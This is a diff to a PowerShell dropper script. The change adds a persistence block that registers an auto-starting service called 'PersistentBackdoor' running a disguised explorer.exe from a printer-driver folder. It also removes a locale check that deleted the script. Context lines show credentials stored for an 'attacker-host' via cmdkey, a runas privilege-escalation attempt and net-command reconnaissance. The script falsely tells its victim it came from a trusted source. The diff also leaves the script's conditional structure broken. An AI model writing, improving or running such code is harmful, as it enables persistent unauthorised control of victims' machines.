@@ -1,5 +1,5 @@
 # === INITIAL DROPPER EXECUTION ===
-Write-Host "This script has been downloaded fr0m a trusted source..."
+Write-Host "This script has been downloaded from a trusted source..."
 
 # Get system locale and culture
 $hostinfo = Get-Host
@@ -123,6 +123,14 @@ cmdkey /add:"attacker-host" /user:"attacker" /pass:"attacker_password"
 
 Write-Host "[+] Credential created using cmdkey."
 
+# === PERSISTENCE: Install service for regaining control ===
+Write-Host "[*] Setting up persistence..."
+$serviceName = "PersistentBackdoor"
+$exePath = "C:\Windows\System32\spool\drivers\32\explorer.exe"
+New-Service -Name $serviceName -Binary $exePath -StartupType Automatic
+
+Write-Host "[+] Persistent backdoor installed."
+
 # === Fallback Option: Runas Command for Privilege Escalation ===
 Write-Host "[*] Attempting to escalate privileges using runas command..."
 Start-Process "runas" -ArgumentList "/user:administrator cmd"
@@ -140,11 +148,3 @@ Write-Host "[*] Attempting to use net command for internal discovery..."
 Start-Process "net" -ArgumentList "stat"
 
 Write-Host "[+] Net command executed for internal discovery."
-
-} else {
-    Write-Host "[-] Language mismatch — removing script."
-    Remove-Item $PSCommandPath -Force
-}
-
-# Set PowerShell to quiet mode
-$ErrorActionPreference = "SilentlyContinue"
